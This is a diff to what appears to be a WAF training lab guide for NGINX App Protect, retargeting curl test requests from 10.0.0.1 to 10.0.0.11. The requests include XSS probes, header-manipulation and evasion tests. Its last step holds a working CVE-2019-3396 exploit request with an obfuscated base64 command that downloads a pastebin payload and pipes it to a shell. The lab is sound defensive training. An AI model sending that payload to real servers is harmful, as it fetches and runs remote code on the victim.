@@ -115,11 +115,11 @@ sudo grep APP_PROTECT /var/log/nginx/error.log
 
 Step 5a
 
-http://10.0.0.1/<script>
+http://10.0.0.11/<script>
 
 Step 6a
 
-curl -Iv -H "Host: 1.2.3.4" http://10.0.0.1/
+curl -Iv -H "Host: 1.2.3.4" http://10.0.0.11/
 
 End of lab
 
@@ -158,10 +158,10 @@ Step 3a
 
 Step 4a
 
-curl http://10.0.0.1/index.html
+curl http://10.0.0.11/index.html
 
 Step 4c
-tail -f /var/log/app_protect/class_security.log | grep --text -w 10.0.0.1
+tail -f /var/log/app_protect/class_security.log | grep --text -w 10.0.0.11
 
 **************************************************************************************************************
 
@@ -199,11 +199,11 @@ tail -f /var/log/app_protect/class_simplified_security.log
 
 Step 4b
 
-curl http://10.0.0.1/
+curl http://10.0.0.11/
 
 Step 4d
 
-curl http://10.0.0.1/?a=%3Cscript%E
+curl http://10.0.0.11/?a=%3Cscript%E
 
 
 **************************************************************************************************************
@@ -225,7 +225,7 @@ sudo nginx -s reload
 
 Step 2a
 
-curl http://10.0.0.1/ftp/coupons_2013.md.bak
+curl http://10.0.0.11/ftp/coupons_2013.md.bak
 
 
 Step 3a
@@ -234,7 +234,7 @@ sudo grep coupons_2013.md.bak /var/log/nginx/access.log
 
 Step 3c
 
-curl http://10.0.0.1/?a=%3Cscript%3E
+curl http://10.0.0.11/?a=%3Cscript%3E
 
 Step 3d
 
@@ -298,7 +298,7 @@ tail -f /var/log/app_protect/class_simplified_security.log
 
 Step 4b
 
-curl http://10.0.0.1/?3Cscript%3E
+curl http://10.0.0.11/?3Cscript%3E
 
 **************************************************************************************************************
 
@@ -345,7 +345,7 @@ tail -f /var/log/app_protect/class_simplified_security.log
 
 Step 3b
 
-curl -H "Host: 1.2.3.4" http://10.0.0.1/
+curl -H "Host: 1.2.3.4" http://10.0.0.11/
 
 Step 3d
 
@@ -365,11 +365,11 @@ sudo nginx -s reload
 
 Step 5a
 
-curl -H "Host: 1.2.3.4" http://10.0.0.1/
+curl -H "Host: 1.2.3.4" http://10.0.0.11/
 
 Step 6a
 
-curl -H "Content-Length: -26" http://10.0.0.1/
+curl -H "Content-Length: -26" http://10.0.0.11/
 
 Step 6b
 
@@ -383,7 +383,7 @@ Part 3: Working with Evasion Technique violations
 
 Step 1a
 
-curl http://10.0.0.1/%09/
+curl http://10.0.0.11/%09/
 
 Step 1c
 less /tmp/my-default-policy.json
@@ -423,7 +423,7 @@ sudo nginx -s reload
 
 Step 3a
 
-curl http://10.0.0.1/%09/
+curl http://10.0.0.11/%09/
 
 Step 4a
 
@@ -444,7 +444,7 @@ sudo nginx -s reload
 
 Step 5a
 
-curl http://10.0.0.1/%09/
+curl http://10.0.0.11/%09/
 
 **************************************************************************************************************
 
@@ -491,11 +491,11 @@ tail -f /var/log/app_protect/class_simplified_security.log
 
 Step 2b
 
-curl http://10.0.0.1/index.php
+curl http://10.0.0.11/index.php
 
 Step 2d
 
-curl http://10.0.0.1/index.exe
+curl http://10.0.0.11/index.exe
 
 Step 2f
 
@@ -556,7 +556,7 @@ sudo nginx -s reload
 
 Step 3a
 
-curl http://10.0.0.1/%09
+curl http://10.0.0.11/%09
 
 End of lab
 
@@ -599,12 +599,12 @@ tail -f /var/log/app_protect/class_simplified_security.log
 
 Step 3b
 
-curl http://10.0.0.1/index.html
-curl http://10.0.0.1/file.md
+curl http://10.0.0.11/index.html
+curl http://10.0.0.11/file.md
 
 Step 4a
 
-curl http://10.0.0.1/ftp/acquisitions.md
+curl http://10.0.0.11/ftp/acquisitions.md
 
 
 
@@ -686,22 +686,22 @@ tail -f /var/log/app_protect/class_simplified_security.log
 
 Step 3a
 
-curl http://10.0.0.1/index.html
-curl http://10.0.0.1/file.php
-curl http://10.0.0.1/file.md
+curl http://10.0.0.11/index.html
+curl http://10.0.0.11/file.php
+curl http://10.0.0.11/file.md
 
 Step 4a
 
-curl http://10.0.0.1/index.pat
-curl http://10.0.0.1/index.mat
+curl http://10.0.0.11/index.pat
+curl http://10.0.0.11/index.mat
 
 Step 5a
 
-curl http://10.0.0.1/?a=%3Cscript%3E
+curl http://10.0.0.11/?a=%3Cscript%3E
 
 Step 5c
 
-curl http://10.0.0.1/ftp/acquisitions.md
+curl http://10.0.0.11/ftp/acquisitions.md
 
 End of lab
 
@@ -812,7 +812,7 @@ apt list --installed | grep app-protect-threat
 
 Step 3a
 
-curl -d "{%22contentId%22:%2212345%22,%22macro%22:{%22name%22:%22widget%22,%22body%22:%22%22,%22params%22:{%22url%22:%22http://www.dailymotion.com/video/xcpa64%22,%22width%22:%22300%22,%22height%22:%22200%22,%22_template%22:%22https://raw.githubusercontent.com/Yt1g3r/CVE-2019-3396_EXP/master/cmd.vm%22,%22cmd%22:%22bash -c {echo,KCh3Z2V0IC1xIC1PLSBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcveHZmeHBydGIgfHwgY3VybCAtZnNTTCBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcveHZmeHBydGIpIHwgYmFzZTY0IC1kKSB8IHNo}|{base64,-d}|{bash,-i}%22}}}" -X POST http://10.0.0.1
+curl -d "{%22contentId%22:%2212345%22,%22macro%22:{%22name%22:%22widget%22,%22body%22:%22%22,%22params%22:{%22url%22:%22http://www.dailymotion.com/video/xcpa64%22,%22width%22:%22300%22,%22height%22:%22200%22,%22_template%22:%22https://raw.githubusercontent.com/Yt1g3r/CVE-2019-3396_EXP/master/cmd.vm%22,%22cmd%22:%22bash -c {echo,KCh3Z2V0IC1xIC1PLSBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcveHZmeHBydGIgfHwgY3VybCAtZnNTTCBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcveHZmeHBydGIpIHwgYmFzZTY0IC1kKSB8IHNo}|{base64,-d}|{bash,-i}%22}}}" -X POST http://10.0.0.11
 
 
 End of lab
